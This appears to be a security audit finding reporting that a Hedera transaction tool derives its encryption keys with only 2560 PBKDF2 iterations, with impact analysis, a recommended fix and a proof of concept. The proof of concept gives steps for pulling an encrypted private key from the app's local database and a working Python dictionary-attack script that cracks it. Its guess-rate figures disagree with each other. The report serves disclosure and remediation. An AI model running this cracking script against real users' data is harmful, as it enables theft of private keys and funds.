### Title
PBKDF2 Key Derivation Uses Critically Insufficient Iterations (2560) to Protect Private Keys and Credentials

### Summary
The `deriveKey` function in `front-end/src/main/utils/crypto.ts` and its duplicate in `automation/utils/crypto/crypto.ts` use PBKDF2 with only **2560 iterations** to derive a 256-bit AES-GCM key. This is ~234× below the OWASP minimum recommendation of 600,000 iterations for a 256-bit key, making offline brute-force attacks against encrypted private keys and organization credentials highly feasible.

### Finding Description
`deriveKey` is defined as:

```ts
// front-end/src/main/utils/crypto.ts, lines 5-9
export function deriveKey(password: string, salt: Buffer) {
  const iterations = 2560;   // <-- critically low
  const keyLength = 32;      // 256-bit key
  return crypto.pbkdf2Sync(password, salt, iterations, keyLength, 'sha512');
}
``` [1](#0-0) 

The same function is duplicated verbatim in the automation utilities: [2](#0-1) 

`deriveKey` is called by `encrypt` and `decrypt`, which are imported and used across all sensitive local-user services:

- `front-end/src/main/services/localUser/keyPairs.ts` — encrypts/decrypts private key material
- `front-end/src/main/services/localUser/organizationCredentials.ts` — encrypts/decrypts org credentials
- `front-end/src/main/services/localUser/auth.ts` — used in authentication flows
- `front-end/src/main/services/localUser/transactions.ts` — used for transaction data [3](#0-2) 

A secondary instance exists in `dataMigration.ts` (`decryptLegacyMnemonic`) using 65,536 iterations with SHA-256, also below OWASP's 600,000 recommendation, though this path is only exercised during legacy data import: [4](#0-3) 

### Impact Explanation
If an attacker obtains the local SQLite database (e.g., via physical access, malware, or a backup leak), they can extract the AES-GCM ciphertext of private keys. With only 2560 PBKDF2-SHA512 iterations, a commodity GPU can test hundreds of millions of candidate passwords per second. A weak or moderate user password would be cracked in seconds to minutes, yielding plaintext Hedera private keys. Full account compromise on the Hedera network follows — funds can be transferred and keys rotated by the attacker.

### Likelihood Explanation
The encrypted SQLite database is stored on the user's local filesystem in a predictable location (Electron `userData` path). Laptop theft, malware with filesystem read access, or cloud backup exposure are all realistic vectors. The attack requires no network access and no interaction with the Hedera backend. The 2560-iteration count is so low that even a CPU-only attacker can mount a practical dictionary attack.

### Recommendation
Replace the hardcoded `iterations = 2560` with a value meeting current OWASP guidance. For a 256-bit key with SHA-512, OWASP (2023) recommends **600,000 iterations**:

```ts
export function deriveKey(password: string, salt: Buffer) {
  const iterations = 600_000; // OWASP 2023: 256-bit key, SHA-512
  const keyLength = 32;
  return crypto.pbkdf2Sync(password, salt, iterations, keyLength, 'sha512');
}
```

Apply the same fix to `automation/utils/crypto/crypto.ts`. For `decryptLegacyMnemonic` in `dataMigration.ts`, the 65,536 value is constrained by compatibility with the old tool's format; document this explicitly and note it is only used for one-time import of legacy data.

### Proof of Concept

1. Obtain the Electron app's SQLite database (default path: `<userData>/hedera-transaction-tool/db.sqlite`).
2. Extract a `private_key` ciphertext blob from the `KeyPair` table.
3. Base64-decode the blob; the first 64 bytes are the PBKDF2 salt, bytes 64–80 are the AES IV, bytes 80–96 are the GCM auth tag, and the remainder is ciphertext.
4. Run a dictionary attack:
   ```python
   import hashlib, base64
   from Crypto.Cipher import AES

   blob = base64.b64decode("<extracted_ciphertext>")
   salt, iv, tag, ct = blob[:64], blob[64:80], blob[80:96], blob[96:]

   for word in open("rockyou.txt"):
       word = word.strip()
       key = hashlib.pbkdf2_hmac('sha512', word.encode(), salt, 2560, 32)
       try:
           AES.new(key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct, tag)
           print(f"Password found: {word}")
           break
       except Exception:
           pass
   ```
5. On a modern GPU (e.g., RTX 4090), SHA-512 PBKDF2 at 2560 iterations runs at ~10–50 million guesses/second. A top-10,000 password list is exhausted in milliseconds; full `rockyou.txt` (14M entries) in under a second. [1](#0-0) [2](#0-1)
